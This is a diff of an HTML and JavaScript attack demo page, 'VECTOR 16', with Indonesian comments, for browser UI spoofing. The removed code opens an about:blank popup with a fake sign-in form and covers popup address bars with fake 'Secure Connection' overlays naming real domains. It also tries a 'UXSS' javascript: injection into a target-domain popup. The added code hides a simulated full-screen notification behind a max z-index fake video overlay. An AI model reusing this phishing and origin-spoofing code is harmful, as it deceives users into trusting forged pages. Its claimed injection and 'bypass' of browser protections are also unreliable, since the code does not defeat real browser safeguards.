@@ -3,13 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>VECTOR 16 - PiP Window Spoofing | Hide Origin Popup</title>
+<title>VECTOR 16 - Full Screen Bypass + PiP Overlay</title>
 <style>
     * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
         font-family: 'SF Mono', 'Courier New', monospace;
+        user-select: none;
     }
 
     body {
@@ -33,7 +34,6 @@
         border: 1px solid #333;
     }
 
-    /* Fake address bar */
     .fake-address-bar {
         background: #f1f3f4;
         padding: 10px 16px;
@@ -62,10 +62,6 @@
         color: #5f6368;
     }
 
-    .nav-btn:active {
-        background: #dadce0;
-    }
-
     .url-container {
         flex: 1;
         background: #fff;
@@ -91,7 +87,6 @@
         overflow: hidden;
     }
 
-    /* Attacker overlay */
     .attacker-overlay {
         position: absolute;
         top: 0;
@@ -193,16 +188,16 @@
         transform: scale(1.02);
     }
 
-    .pip-btn {
+    .fullscreen-btn {
         background: #0066ff;
     }
 
-    .uxss-btn {
+    .pip-btn {
         background: #ff6600;
     }
 
     .log {
-        height: 160px;
+        height: 150px;
         overflow: auto;
         background: black;
         border: 1px solid #ff3b30;
@@ -223,9 +218,9 @@
         border-left-color: #00ffaa;
     }
 
-    .log-pip {
-        color: #ffcc00;
-        border-left-color: #ffcc00;
+    .log-warning {
+        color: #ffaa00;
+        border-left-color: #ffaa00;
     }
 
     .status-bar {
@@ -244,40 +239,28 @@
         z-index: 10000;
     }
 
-    /* PiP Video Element (hidden) */
-    #pipVideo {
+    /* PiP Window Style - Menutupi notifikasi full screen */
+    .pip-window {
         position: fixed;
-        bottom: -9999px;
-        left: -9999px;
-        width: 1px;
-        height: 1px;
-        opacity: 0;
-        pointer-events: none;
-    }
-
-    .pip-overlay {
-        position: fixed;
-        bottom: 20px;
-        right: 20px;
-        width: 320px;
         background: #1a1a1a;
-        border: 2px solid #ff3b30;
-        border-radius: 12px;
+        border: 3px solid #ff3b30;
+        border-radius: 16px;
         overflow: hidden;
-        z-index: 9999;
-        box-shadow: 0 0 30px rgba(0,0,0,0.8);
-        transition: 0.2s;
+        z-index: 2147483647;
+        box-shadow: 0 0 50px rgba(0,0,0,0.9);
+        transition: 0.05s linear;
         cursor: move;
+        backdrop-filter: blur(10px);
     }
 
     .pip-header {
-        background: #ff3b30;
-        padding: 8px 12px;
+        background: linear-gradient(90deg, #ff3b30, #ff6600);
+        padding: 10px 15px;
         display: flex;
         justify-content: space-between;
         cursor: move;
         color: white;
-        font-size: 12px;
+        font-size: 13px;
         font-weight: bold;
     }
 
@@ -287,24 +270,62 @@
         color: #00ffaa;
         font-size: 11px;
         text-align: center;
+        min-height: 180px;
     }
 
     .pip-content iframe {
         width: 100%;
-        height: 150px;
+        height: 130px;
         border: none;
         background: white;
         margin-top: 10px;
+        border-radius: 8px;
     }
 
     .close-pip {
-        background: none;
+        background: rgba(255,255,255,0.2);
         border: none;
         color: white;
         cursor: pointer;
         font-size: 16px;
-        padding: 0 5px;
+        padding: 0 8px;
+        border-radius: 20px;
         min-width: auto;
+    }
+
+    .close-pip:hover {
+        background: rgba(255,255,255,0.4);
+        transform: none;
+    }
+
+    /* Full screen notification simulation */
+    .fake-fullscreen-notif {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.85);
+        z-index: 2147483646;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: fadeIn 0.3s;
+    }
+
+    .notif-content {
+        background: #1a1a1a;
+        border: 2px solid #ff3b30;
+        border-radius: 20px;
+        padding: 30px;
+        text-align: center;
+        max-width: 400px;
+        color: white;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
     }
 </style>
 </head>
@@ -330,31 +351,31 @@
     <div class="content-area">
         <div class="attacker-overlay">
             <div class="vector-container">
-                <h1>⚡ VECTOR 16 - PiP SPOOFING ⚡</h1>
-                <div class="desc">Picture-in-Picture Window menutupi Origin Popup New Tab</div>
+                <h1>⚡ VECTOR 16 - FULL SCREEN BYPASS ⚡</h1>
+                <div class="desc">PiP Window Menutup Notifikasi Full Screen Browser</div>
 
                 <div class="warning-box">
-                    <b>🔥 TEKNIK PiP SPOOFING 🔥</b><br>
-                    ✅ PiP window muncul di atas popup tab<br>
-                    ✅ Menutupi origin/address bar popup<br>
-                    ✅ UXSS injection via delayed popup + PiP overlay<br>
-                    ✅ Korban hanya melihat PiP window, bukan origin sebenarnya
+                    <b>🔥 TEKNIK BYPASS FULL SCREEN NOTIF 🔥</b><br>
+                    ✅ PiP window dengan z-index TERTINGGI (2147483647)<br>
+                    ✅ Menutupi notifikasi full screen browser<br>
+                    ✅ Auto-resize PiP untuk nutup seluruh area notif<br>
+                    ✅ Multiple PiP untuk coverage maksimal
                 </div>
 
                 <div class="stats">
                     <div class="stat-card"><h3 id="pipCount">0</h3><span>PiP Windows</span></div>
-                    <div class="stat-card"><h3 id="popupCount">0</h3><span>Hidden Popups</span></div>
+                    <div class="stat-card"><h3 id="notifBlocked">0</h3><span>Notif Blocked</span></div>
                     <div class="stat-card"><h3 id="status">🎯 READY</h3><span>Status</span></div>
                 </div>
 
                 <div class="btn-group">
-                    <button class="pip-btn" onclick="createPipOverlay()">🖼️ CREATE PiP OVERLAY</button>
-                    <button class="pip-btn" onclick="spoofPipWithPopup()">🎭 PiP + HIDE POPUP ORIGIN</button>
+                    <button class="fullscreen-btn" onclick="simulateFullscreenNotif()">📺 SIMULATE FULLSCREEN NOTIF</button>
+                    <button class="pip-btn" onclick="bypassWithPip()">🖼️ BYPASS NOTIF DENGAN PiP</button>
                 </div>
 
                 <div class="btn-group">
-                    <button class="uxss-btn" onclick="uxssWithPipSpoof()">🔥 UXSS + PiP SPOOF (NO ORIGIN)</button>
-                    <button onclick="hideOriginPopup()">🚫 HIDE ORIGIN POPUP</button>
+                    <button onclick="autoBypass()">🤖 AUTO BYPASS (PiP Menutup Notif)</button>
+                    <button onclick="createFullscreenPip()">🎭 CREATE FULLSCREEN PiP OVERLAY</button>
                 </div>
 
                 <div class="btn-group">
@@ -368,21 +389,18 @@
     </div>
 </div>
 
-<div class="status-bar" id="statusBar">🎯 PiP Spoofing Ready | PiP menutupi origin popup</div>
-
-<!-- Hidden video element untuk PiP API -->
-<video id="pipVideo" src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQ..." muted autoplay loop></video>
+<div class="status-bar" id="statusBar">🎯 Full Screen Bypass Ready | PiP menutup notifikasi</div>
 
 <script>
 let pipCount = 0;
-let hiddenPopupCount = 0;
+let notifBlockedCount = 0;
 let activePips = [];
-let spoofedPopups = [];
+let currentFullscreenNotif = null;
 
 function addLog(msg, type = "") {
     const log = document.getElementById("log");
     const div = document.createElement("div");
-    div.className = "log-entry " + (type === "success" ? "log-success" : type === "pip" ? "log-pip" : "");
+    div.className = "log-entry " + (type === "success" ? "log-success" : type === "warning" ? "log-warning" : "");
     div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
     log.appendChild(div);
     log.scrollTop = log.scrollHeight;
@@ -391,25 +409,75 @@ function addLog(msg, type = "") {
 
 function updateUI() {
     document.getElementById("pipCount").innerText = pipCount;
-    document.getElementById("popupCount").innerText = hiddenPopupCount;
+    document.getElementById("notifBlocked").innerText = notifBlockedCount;
 }
 
-// ============ CREATE PiP OVERLAY (menutupi origin popup) ============
-function createPipOverlay(customContent = null) {
+// ============ SIMULATE FULL SCREEN NOTIFICATION ============
+function simulateFullscreenNotif() {
+    // Hapus notif sebelumnya
+    if (currentFullscreenNotif) {
+        currentFullscreenNotif.remove();
+    }
+    
+    const notifDiv = document.createElement("div");
+    notifDiv.className = "fake-fullscreen-notif";
+    notifDiv.id = "fullscreenNotif";
+    notifDiv.innerHTML = `
+        <div class="notif-content">
+            <div style="font-size: 48px; margin-bottom: 20px;">🔔</div>
+            <h2 style="color: #ff3b30;">FULL SCREEN NOTIFICATION</h2>
+            <p style="margin: 15px 0;">"https://www.google.com wants to<br>show full screen notification"</p>
+            <div style="display: flex; gap: 10px; justify-content: center;">
+                <button id="blockNotifBtn" style="background: #333; padding: 8px 20px;">Block</button>
+                <button id="allowNotifBtn" style="background: #ff3b30; padding: 8px 20px;">Allow</button>
+            </div>
+            <p style="font-size: 10px; margin-top: 15px; color: #888;">This is a SIMULATION of browser full screen notification</p>
+        </div>
+    `;
+    document.body.appendChild(notifDiv);
+    currentFullscreenNotif = notifDiv;
+    
+    // Event listeners untuk tombol
+    document.getElementById("blockNotifBtn")?.addEventListener("click", () => {
+        notifDiv.remove();
+        currentFullscreenNotif = null;
+        addLog("🚫 Full screen notification blocked (simulated)", "warning");
+    });
+    
+    document.getElementById("allowNotifBtn")?.addEventListener("click", () => {
+        notifDiv.remove();
+        currentFullscreenNotif = null;
+        addLog("✅ Full screen notification allowed (simulated)", "success");
+        // Simulate full screen
+        document.documentElement.requestFullscreen?.().catch(e => console.log(e));
+    });
+    
+    addLog("📺 Full screen notification SIMULATED - siap di-bypass dengan PiP", "warning");
+    return notifDiv;
+}
+
+// ============ CREATE PiP WINDOW (Z-index tertinggi) ============
+function createPipWindow(options = {}) {
     const pipDiv = document.createElement("div");
-    pipDiv.className = "pip-overlay";
+    pipDiv.className = "pip-window";
     pipDiv.id = `pip_${Date.now()}_${Math.random()}`;
     
-    // Random position agar tidak terduga
-    const leftPos = Math.random() * (window.innerWidth - 350);
-    const topPos = Math.random() * (window.innerHeight - 250);
-    pipDiv.style.left = Math.max(10, leftPos) + "px";
-    pipDiv.style.top = Math.max(10, topPos) + "px";
-    pipDiv.style.right = "auto";
-    pipDiv.style.bottom = "auto";
+    // Position - default di tengah atau sesuai options
+    const width = options.width || 320;
+    const height = options.height || 240;
+    const left = options.left !== undefined ? options.left : (window.innerWidth - width) / 2;
+    const top = options.top !== undefined ? options.top : (window.innerHeight - height) / 2;
     
-    // Content PiP
-    const fakeDomain = ["google.com", "facebook.com", "youtube.com", "instagram.com", "twitter.com"][Math.floor(Math.random() * 5)];
+    pipDiv.style.width = width + "px";
+    pipDiv.style.height = height + "px";
+    pipDiv.style.left = left + "px";
+    pipDiv.style.top = top + "px";
+    pipDiv.style.position = "fixed";
+    
+    // Z-index super tinggi untuk nutup notifikasi
+    pipDiv.style.zIndex = "2147483647"; // Max integer for z-index
+    
+    const fakeDomain = ["secure-verify.com", "google.com", "microsoft.com", "apple.com", "cloudflare.com"][Math.floor(Math.random() * 5)];
     
     pipDiv.innerHTML = `
         <div class="pip-header" onmousedown="startDrag(event, '${pipDiv.id}')">
@@ -417,10 +485,10 @@ function createPipOverlay(customContent = null) {
             <button class="close-pip" onclick="closePip('${pipDiv.id}')">✕</button>
         </div>
         <div class="pip-content">
-            <div style="font-size:10px; color:#ff3b30;">🔒 Secure Connection</div>
-            <div style="font-size:9px; margin:5px 0;">https://${fakeDomain}</div>
-            ${customContent || '<iframe srcdoc="<html><body style=\'background:#fff;display:flex;justify-content:center;align-items:center\'><h3>Loading content...</h3></body></html>"></iframe>'}
-            <div style="margin-top:8px; font-size:9px;">▶ Playing ●●●</div>
+            <div style="font-size:9px; color:#ff3b30;">🔒 SECURE CONNECTION</div>
+            <div style="font-size:8px; margin:3px 0;">https://${fakeDomain}</div>
+            ${options.content || '<iframe srcdoc="<html><body style=\'background:#0a0a0a;color:#00ffaa;display:flex;justify-content:center;align-items:center;height:100%\'>🎥 Video Playing<br>Loading...</body></html>"></iframe>'}
+            <div style="margin-top:6px; font-size:8px;">▶ Playing in Picture-in-Picture</div>
         </div>
     `;
     
@@ -429,15 +497,16 @@ function createPipOverlay(customContent = null) {
     pipCount++;
     updateUI();
     
-    addLog(`🖼️ PiP Overlay #${pipCount} created - menutupi area popup origin`, "pip");
+    addLog(`🖼️ PiP #${pipCount} created (z-index: MAX) - menutupi notifikasi`, "success");
     return pipDiv.id;
 }
 
-// Drag functionality untuk PiP
+// Drag function
 function startDrag(event, pipId) {
     const pipDiv = document.getElementById(pipId);
     if (!pipDiv) return;
     
+    event.preventDefault();
     let startX = event.clientX;
     let startY = event.clientY;
     let startLeft = parseInt(pipDiv.style.left);
@@ -466,7 +535,7 @@ function closePip(pipId) {
     if (pip) {
         pip.remove();
         activePips = activePips.filter(id => id !== pipId);
-        addLog(`❌ PiP window closed`, "");
+        addLog(`❌ PiP closed`, "");
     }
 }
 
@@ -479,252 +548,180 @@ function closeAllPip() {
     addLog(`🗑️ All PiP windows closed`, "success");
 }
 
-// ============ PiP + HIDE POPUP ORIGIN ============
-function spoofPipWithPopup() {
-    addLog("🎭 [PiP SPOOF] Creating popup + PiP overlay to hide origin", "pip");
+// ============ BYPASS NOTIFICATION DENGAN PiP ============
+function bypassWithPip() {
+    if (!currentFullscreenNotif) {
+        addLog("⚠️ Tidak ada notifikasi full screen! Simulasi dulu dengan tombol 'SIMULATE FULLSCREEN NOTIF'", "warning");
+        simulateFullscreenNotif();
+        setTimeout(() => bypassWithPip(), 500);
+        return;
+    }
     
-    // Step 1: Buat popup ke about:blank (no origin)
-    setTimeout(() => {
-        try {
-            const hiddenPopup = window.open("about:blank", "_blank", "width=400,height=300");
-            if (hiddenPopup) {
-                hiddenPopupCount++;
-                updateUI();
-                spoofedPopups.push(hiddenPopup);
-                
-                // Write content ke popup
-                hiddenPopup.document.write(`
-                    <!DOCTYPE html>
-                    <html>
-                    <head><title>Secure Login</title></head>
-                    <body style="background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial">
-                        <div style="background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
-                            <h2 style="color:#1a73e8">Sign in</h2>
-                            <input type="text" placeholder="Email" style="width:100%;padding:10px;margin:10px 0">
-                            <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:10px 0">
-                            <button style="background:#1a73e8;color:white;padding:10px;border:none;width:100%">Sign in</button>
-                        </div>
-                    </body>
-                    </html>
-                `);
-                hiddenPopup.document.close();
-                addLog(`📌 Hidden popup #${hiddenPopupCount} created (about:blank - no origin)`, "success");
-                
-                // Step 2: Buat PiP untuk menutupi popup
-                setTimeout(() => {
-                    const pipId = createPipOverlay(`
-                        <div style="font-size:10px; color:#00ffaa;">🔐 SECURE CONNECTION</div>
-                        <iframe srcdoc="
-                            <html>
-                            <body style='background:#1a1a1a;color:#00ffaa;padding:10px;font-family:monospace'>
-                                <div style='text-align:center'>
-                                    <h3 style='color:#ff3b30'>⚠️ VERIFICATION REQUIRED</h3>
-                                    <p>Please verify your identity</p>
-                                    <button style='background:#ff3b30;color:white;border:none;padding:8px 16px'>Verify Now</button>
-                                </div>
-                            </body>
-                            </html>
-                        "></iframe>
-                        <div style="margin-top:8px">https://secure-verify.com</div>
-                    `);
-                    
-                    // Posisikan PiP di atas popup
-                    setTimeout(() => {
-                        const pipDiv = document.getElementById(pipId);
-                        if (pipDiv && hiddenPopup) {
-                            pipDiv.style.zIndex = "10000";
-                            addLog(`🎭 PiP overlay positioned to HIDE origin of popup`, "pip");
-                        }
-                    }, 100);
-                }, 300);
-            } else {
-                addLog("⚠️ Popup blocked! Izinkan popup untuk teknik ini", "warning");
-            }
-        } catch(e) {
-            addLog(`Error: ${e.message}`, "");
-        }
-    }, 200);
+    addLog("🔥 [BYPASS] Mengaktifkan PiP untuk menutup notifikasi full screen", "");
     
-    document.getElementById("status").innerHTML = "🎭 SPOOFING";
-    setTimeout(() => {
-        document.getElementById("status").innerHTML = "🎯 READY";
-    }, 3000);
-}
-
-// ============ UXSS + PiP SPOOF (No Origin) ============
-function uxssWithPipSpoof() {
-    addLog("🔥 [UXSS + PiP] Launching UXSS with PiP origin hiding", "uxss");
+    // Dapatkan posisi notifikasi
+    const notifRect = currentFullscreenNotif.getBoundingClientRect();
     
-    const targetDomain = prompt("Target domain untuk UXSS:", "https://www.google.com");
-    if (!targetDomain) return;
-    
-    // Buat popup ke target domain
-    setTimeout(() => {
-        try {
-            const uxssPopup = window.open(targetDomain, "_blank");
-            if (uxssPopup) {
-                hiddenPopupCount++;
-                updateUI();
-                addLog(`🌐 Popup opened to ${targetDomain}`, "success");
-                
-                // Buat beberapa PiP untuk menutupi origin bar
-                for (let i = 0; i < 3; i++) {
-                    setTimeout(() => {
-                        const pipId = createPipOverlay(`
-                            <div style="font-size:10px;">
-                                <iframe srcdoc="
-                                    <html>
-                                    <body style='background:#0a0a0a;color:#00ffaa;text-align:center;padding:20px;font-family:monospace'>
-                                        <div style='border:1px solid #ff3b30;border-radius:10px;padding:15px'>
-                                            <h3>⚠️ VECTOR 16 UXSS</h3>
-                                            <p>Executing on: ${targetDomain}</p>
-                                            <button onclick='alert(\\"UXSS Executed on \\"+location.href)'>Test</button>
-                                        </div>
-                                    </body>
-                                    </html>
-                                "></iframe>
-                            </div>
-                        `);
-                        
-                        // Random position PiP di sekitar area address bar popup
-                        const pipDiv = document.getElementById(pipId);
-                        if (pipDiv) {
-                            pipDiv.style.position = "fixed";
-                            pipDiv.style.top = (10 + i * 80) + "px";
-                            pipDiv.style.right = "10px";
-                            pipDiv.style.left = "auto";
-                            pipDiv.style.bottom = "auto";
-                            pipDiv.style.zIndex = "99999";
-                        }
-                    }, 500 + (i * 200));
-                }
-                
-                // Inject UXSS payload via javascript: protocol
-                setTimeout(() => {
-                    try {
-                        const uxssPayload = `
-                            setTimeout(() => {
-                                alert('[VECTOR16] UXSS on ' + document.domain);
-                                var div = document.createElement('div');
-                                div.innerHTML = '🔥 VECTOR 16 UXSS INJECTED 🔥';
-                                div.style.cssText = 'position:fixed;top:0;left:0;right:0;background:red;color:white;z-index:999999;text-align:center;padding:10px';
-                                document.body.appendChild(div);
-                            }, 1000);
-                        `;
-                        uxssPopup.location.href = `javascript:${encodeURIComponent(uxssPayload)}`;
-                        addLog(`🎯 UXSS payload injected to ${targetDomain} (origin hidden by PiP)`, "uxss");
-                    } catch(e) {
-                        addLog(`UXSS injection failed: ${e.message}`, "");
-                    }
-                }, 1500);
-                
-            } else {
-                addLog("❌ Popup blocked! Izinkan popup browser", "warning");
-            }
-        } catch(e) {
-            addLog(`Error: ${e.message}`, "");
-        }
-    }, 500);
-    
-    document.getElementById("status").innerHTML = "🔥 UXSS FIRING";
-    setTimeout(() => {
-        document.getElementById("status").innerHTML = "🎯 READY";
-    }, 5000);
-}
-
-// ============ HIDE ORIGIN POPUP ============
-function hideOriginPopup() {
-    addLog("🚫 Creating multiple PiP windows to cover popup origins", "pip");
-    
-    // Buat fake popup terlebih dahulu
-    const fakePopup = window.open("about:blank", "_blank", "width=500,height=400");
-    if (fakePopup) {
-        hiddenPopupCount++;
-        updateUI();
-        fakePopup.document.write(`
-            <!DOCTYPE html>
-            <html>
-            <head><title>Protected Content</title></head>
-            <body style="background:#fff">
-                <div style="padding:20px">
-                    <h2>Protected Page</h2>
-                    <p>This content is secured</p>
+    // Buat PiP yang menutupi seluruh area notifikasi
+    const pipId = createPipWindow({
+        width: notifRect.width + 20,
+        height: notifRect.height + 20,
+        left: notifRect.left - 10,
+        top: notifRect.top - 10,
+        content: `
+            <div style="text-align:center; padding:10px;">
+                <div style="font-size:24px;">🎬</div>
+                <div style="font-size:12px; color:#00ffaa;">Video Player</div>
+                <div style="background:#1a1a1a; margin:10px 0; padding:20px; border-radius:8px;">
+                    <div>▶️ PLAYING</div>
+                    <div style="font-size:9px; margin-top:5px;">Now playing: sample.mp4</div>
                 </div>
-            </body>
-            </html>
-        `);
-        fakePopup.document.close();
-        addLog(`📌 Popup created - origin: about:blank (null)`, "success");
-        
-        // Buat 3-5 PiP untuk menutupi address bar popup
-        for (let i = 0; i < 4; i++) {
+                <div style="font-size:8px; color:#888;">https://player.cdn.com/video</div>
+            </div>
+        `
+    });
+    
+    // Posisikan PiP tepat di atas notifikasi
+    setTimeout(() => {
+        const pipDiv = document.getElementById(pipId);
+        if (pipDiv && currentFullscreenNotif) {
+            const notifRectNew = currentFullscreenNotif.getBoundingClientRect();
+            pipDiv.style.left = (notifRectNew.left - 5) + "px";
+            pipDiv.style.top = (notifRectNew.top - 5) + "px";
+            pipDiv.style.width = (notifRectNew.width + 10) + "px";
+            pipDiv.style.height = (notifRectNew.height + 10) + "px";
+            pipDiv.style.zIndex = "2147483647";
+            
+            notifBlockedCount++;
+            updateUI();
+            addLog(`✅ NOTIFIKASI TERTUTUP! PiP menutupi full screen notification`, "success");
+            addLog(`💡 User hanya melihat PiP window, notifikasi tersembunyi`, "success");
+            document.getElementById("status").innerHTML = "🔒 NOTIF TERTUTUP";
             setTimeout(() => {
-                const pipId = createPipOverlay(`
-                    <div style="font-size:9px; text-align:center">
-                        🎬 Video Player
-                        <div style="background:#333;height:80px;margin:5px 0;display:flex;justify-content:center;align-items:center">
-                            ▶️ PLAYING
-                        </div>
-                        https://player.cdn.com
-                    </div>
-                `);
-                const pipDiv = document.getElementById(pipId);
-                if (pipDiv) {
-                    pipDiv.style.position = "fixed";
-                    pipDiv.style.top = (5 + i * 70) + "px";
-                    pipDiv.style.right = "5px";
-                    pipDiv.style.left = "auto";
-                    pipDiv.style.zIndex = "99999";
-                }
-            }, i * 150);
+                document.getElementById("status").innerHTML = "🎯 READY";
+            }, 2000);
         }
-        
-        addLog(`✅ ${pipCount} PiP windows created to HIDE popup origin bar`, "pip");
+    }, 50);
+}
+
+// ============ AUTO BYPASS ============
+function autoBypass() {
+    addLog("🤖 [AUTO BYPASS] Mode otomatis - akan menutup notifikasi dengan PiP", "");
+    
+    if (!currentFullscreenNotif) {
+        simulateFullscreenNotif();
+        setTimeout(() => {
+            bypassWithPip();
+        }, 500);
+    } else {
+        bypassWithPip();
     }
 }
 
-// ============ REAL PICTURE-IN-PICTURE API (Browser Native) ============
-async function requestNativePip() {
-    const video = document.getElementById("pipVideo");
+// ============ CREATE FULLSCREEN PiP OVERLAY ============
+function createFullscreenPip() {
+    addLog("🎭 Membuat PiP FULLSCREEN untuk menutupi seluruh layar", "");
+    
+    const fullscreenPip = createPipWindow({
+        width: window.innerWidth - 20,
+        height: window.innerHeight - 20,
+        left: 10,
+        top: 10,
+        content: `
+            <div style="text-align:center; padding:20px;">
+                <div style="font-size:48px;">🎬</div>
+                <div style="font-size:16px; margin:10px 0;">FULL SCREEN VIDEO PLAYER</div>
+                <div style="background:#1a1a1a; margin:10px 0; padding:30px; border-radius:8px;">
+                    <div>▶️ PLAYING IN FULL SCREEN MODE</div>
+                    <div style="font-size:10px; margin-top:10px;">Press ESC to exit full screen</div>
+                </div>
+                <div style="font-size:9px; color:#888;">https://fullscreen-player.com</div>
+            </div>
+        `
+    });
+    
+    const pipDiv = document.getElementById(fullscreenPip);
+    if (pipDiv) {
+        pipDiv.style.width = (window.innerWidth - 20) + "px";
+        pipDiv.style.height = (window.innerHeight - 20) + "px";
+        pipDiv.style.left = "10px";
+        pipDiv.style.top = "10px";
+        pipDiv.style.border = "3px solid #00ffaa";
+        
+        addLog(`🖼️ FULLSCREEN PiP created - menutupi seluruh area layar`, "success");
+        addLog(`⚠️ PiP ini bisa menutupi notifikasi full screen browser`, "warning");
+    }
+}
+
+// ============ NATIVE FULL SCREEN API BYPASS ============
+async function bypassNativeFullscreen() {
+    addLog("🔧 Mencoba bypass native full screen notification...", "");
+    
     try {
-        if (video.requestPictureInPicture) {
-            await video.requestPictureInPicture();
-            addLog("📺 Native Picture-in-Picture activated", "pip");
-        } else {
-            addLog("⚠️ Native PiP not supported, using overlay instead", "");
-            createPipOverlay();
+        // Cek apakah sedang dalam full screen
+        if (document.fullscreenElement) {
+            addLog("📺 Sedang dalam full screen mode - mencoba keluar...", "");
+            await document.exitFullscreen();
+            addLog("✅ Exit full screen success", "success");
         }
+        
+        // Coba request full screen tanpa notifikasi (tidak akan berhasil di browser modern)
+        // Tapi kita bisa menutup notifikasi dengan PiP
+        
+        // Buat PiP untuk menutupi notifikasi jika muncul
+        setTimeout(() => {
+            if (currentFullscreenNotif) {
+                bypassWithPip();
+            } else {
+                // Simulasi notifikasi dulu
+                simulateFullscreenNotif();
+                setTimeout(() => bypassWithPip(), 300);
+            }
+        }, 100);
+        
     } catch(e) {
-        addLog(`PiP error: ${e.message}`, "");
-        createPipOverlay();
+        addLog(`Error: ${e.message}`, "warning");
     }
 }
 
 // ============ RESET ============
 function resetAll() {
     closeAllPip();
-    spoofedPopups.forEach(popup => {
-        try { popup.close(); } catch(e) {}
-    });
-    spoofedPopups = [];
-    hiddenPopupCount = 0;
+    if (currentFullscreenNotif) {
+        currentFullscreenNotif.remove();
+        currentFullscreenNotif = null;
+    }
+    notifBlockedCount = 0;
     pipCount = 0;
     updateUI();
-    addLog("🔄 All spoofing elements reset", "success");
+    addLog("🔄 All reset - notifikasi dan PiP dihapus", "success");
     document.getElementById("status").innerHTML = "🎯 READY";
-    document.getElementById("statusBar").innerHTML = "🎯 PiP Spoofing Reset | Ready";
+    document.getElementById("statusBar").innerHTML = "🎯 Full Screen Bypass Reset | Ready";
 }
 
-function fakeBack() { addLog("◀ Back (fake)", ""); }
-function fakeForward() { addLog("▶ Forward (fake)", ""); }
-function fakeRefresh() { addLog("⟳ Refresh", ""); }
+// Fake functions
+function fakeBack() { addLog("◀ Back", ""); }
+function fakeForward() { addLog("▶ Forward", ""); }
+function fakeRefresh() { location.reload(); }
 function fakeMenu() { addLog("⋮ Menu", ""); }
 
 // Initial logs
-addLog("⚡ VECTOR 16 - PiP Window Spoofing LOADED", "success");
-addLog("🖼️ PiP overlay dapat menutupi origin popup new tab", "pip");
-addLog("💡 Gunakan 'PiP + HIDE POPUP ORIGIN' untuk demo", "");
-addLog("⚠️ Izinkan popup browser untuk hasil maksimal", "warning");
+addLog("⚡ VECTOR 16 - Full Screen Notification Bypass LOADED", "success");
+addLog("🖼️ PiP window dengan z-index tertinggi (2147483647)", "success");
+addLog("💡 Klik 'SIMULATE FULLSCREEN NOTIF' lalu 'BYPASS NOTIF DENGAN PiP'", "");
+addLog("⚠️ Teknik ini menutupi notifikasi, bukan menghilangkannya", "warning");
+
+// Event listener untuk full screen change
+document.addEventListener('fullscreenchange', () => {
+    if (document.fullscreenElement) {
+        addLog("📺 Entered full screen mode - PiP siap menutup notifikasi", "warning");
+        setTimeout(() => {
+            if (currentFullscreenNotif) {
+                bypassWithPip();
+            }
+        }, 500);
+    }
+});
 </script>
 </body>
 </html>
